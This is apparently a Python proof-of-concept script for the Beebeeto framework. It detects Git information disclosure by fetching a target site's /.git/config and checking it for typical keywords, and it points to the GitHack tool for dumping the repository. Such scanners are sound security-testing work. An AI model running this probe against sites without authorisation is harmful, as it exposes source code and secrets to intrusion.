#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0112',
            'name': 'Git information disclosure POC',
            'author': 't0nyhj',
            'create_date': '2015-06-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'N/A',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['information disclosure', 'git信息泄露漏洞', 'git'],
            'desc': 'use git incorrect cause site information disclosure',
            'exploit':'https://github.com/lijiejie/GitHack',
            'references': ['http://wooyun.org/bugs/wooyun-2010-0100762',
                           'http://www.beebeeto.com/pdb/poc-2014-0024/',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        keyword = ['core','remote','branch']
        vul_url = args["options"]["target"] + '/.git/config'
        if args['options']['verbose']:
            print "[*] Request URL:", vul_url
        resquest = urllib2.Request(vul_url)
        response = urllib2.urlopen(resquest)
        if response.getcode() != 200:
            args["success"] = False
            return args
        content = response.read()
        flag = False
        for word in keyword:
            if word in content:
                flag = True
                break
        if flag == True:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())